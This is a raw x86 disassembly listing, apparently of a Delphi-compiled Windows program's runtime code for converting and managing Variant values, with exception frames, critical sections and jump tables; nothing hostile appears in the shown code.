call sub_40ed04
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404244
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407e9c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404010
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407e9c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404010
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407e9c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404010
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_407f88
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404010
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_407f88
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404010
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ef7c
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40edc8
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404010
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f4ba
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403fe0
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4046b4
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403fe0
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4046b4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fe0
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40ee94
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404010
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404010
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e1c8
test ah 0x40
je r-xdata
mov eax esi
call sub_403fbc
mov edx eax
mov eax ebx
call sub_40eef8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40edc8
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_404010
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40edc8
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404010
jmp r-xdata
jmp [ eax * 4 + jump_table_40f249 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e9c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404010
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407e9c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404010
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4092c0
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404010
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4092c0
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404010
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ec94
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404244
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40eccc
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404244
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4041e4
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ed04
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404244
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e9c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404010
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e9c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404010
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e9c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404010
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_407f88
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404010
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_407f88
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404010
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ef7c
jmp r-xdata
sub_40f4c0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f56a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f54d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e608
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4047ac
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404898
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f554
lea eax [ ebp - 0x10 ]
call sub_40e928
retn
sub_40f578
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f5ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40ec50
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f6a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f5d5
lea eax [ ebp - 0x10 ]
call sub_40e928
retn
sub_40f5dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40f694
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410314
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f69b
lea eax [ ebp - 0x20 ]
call sub_40469c
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f677
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4047ac
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404898
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e928
retn
sub_40f6a4
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40fbf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f6de ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4047e8
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_40469c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407e9c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4047e8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407e9c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4047e8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4092c0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047e8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4092c0
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4047e8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ec94
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4046d8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40eccc
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4046d8
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4047ac
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404898
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40ed04
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4046d8
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407e9c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4047e8
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407e9c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4047e8
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407e9c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4047e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_407f88
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4047e8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_407f88
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4047e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f6a4
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f4c0
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4046d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fbfd
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4046b4
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403fe0
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4046b4
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403fe0
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4046b4
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403fe0
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4046b4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fe0
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f578
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4046d8
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4047e8
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e1c8
test ah 0x40
je r-xdata
mov eax esi
call sub_40469c
mov edx eax
mov eax ebx
call sub_40f5dc
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f4c0
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4046d8
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f4c0
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4046d8
jmp r-xdata
jmp [ eax * 4 + jump_table_40f965 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e9c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4047e8
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407e9c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4047e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4092c0
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4047e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4092c0
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4047e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40ec94
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4046d8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40eccc
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4046d8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4047ac
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ed04
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4046d8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e9c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4047e8
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e9c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4047e8
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e9c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4047e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_407f88
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4047e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_407f88
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4047e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f6a4
jmp r-xdata
sub_40fc04
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40e8ac
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_40fc40
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e8ac
sub_40fc6c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40e8ac
sub_40fcd0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404010
pop esi
pop ebx
retn
mov eax ebx
call sub_40e8ac
sub_40fcfc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404898
pop esi
pop ebx
retn
mov eax ebx
call sub_40e8ac
sub_40feb8
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ffde
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_404010
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_404010
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_410314
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404010
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042c8
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_407fb0
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4042c8
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031bc
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402854
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404220
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ffe5
lea eax [ ebp - 0x208 ]
call sub_403fbc
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042c8
sub_410060
dec [ eax + 0x80040dc ]
push esi
popad
jb r-xdata
cmp bh bh
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_410314
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_410294
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_410070
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4100d1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404db4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4100d8
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_40326c
sub_410120
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_410294
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_410314
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_410174
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4101ac
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_410294
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4101e8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035f8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41024b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410252
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4102ec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403320
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_410314
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4103bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404db4
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4103cc
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4104a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410485
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404dbc
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41048c
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4031bc
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404220
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407c68
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4104bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41052b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410532
retn
call sub_410070
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404f7c
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404a44
mov eax rw-data
call sub_403fbc
mov eax rw-data
call sub_40e93c
sub_410534
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4105d5
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4105dc
retn
mov eax rw-data
call sub_410040
mov eax sub_40e63c
mov [ rw-data ] eax
mov eax sub_40e264
mov [ rw-data ] eax
mov edx sub_40e174
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40e93c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fd34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ec50
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ef7c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f6a4
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4105e0
test [ fs : esi ] 0xab
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + edi * 8 - 0x99c0000 ] ch
inc esi
add [ ebp + 0x640000ff ] ch
test [ esi ] 0xae
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] ch
test [ esi ] 0x90
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] dl
test [ esi ] 0x92
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] dl
test [ esi ] 0x94
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp + 0x640000ff ] dl
test [ esi ] 0x96
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] dl
test [ esi ] 0x98
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] bl
test [ esi ] 0x9a
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] bl
test [ esi ] 0x9c
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp + 0x640000ff ] bl
test [ esi ] 0x9e
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] bl
test [ esi ] 0x80
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] al
test [ esi ] 0x82
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] al
test [ esi ] 0x84
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp + 0x640000ff ] al
test [ esi ] 0x86
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + 0x550000ff ] al
mov ebp esp
xor eax eax
push ebp
push sub_4106ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4106f4
retn
sub_410738
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_410784
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_41072c
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_407fd8
pop esi
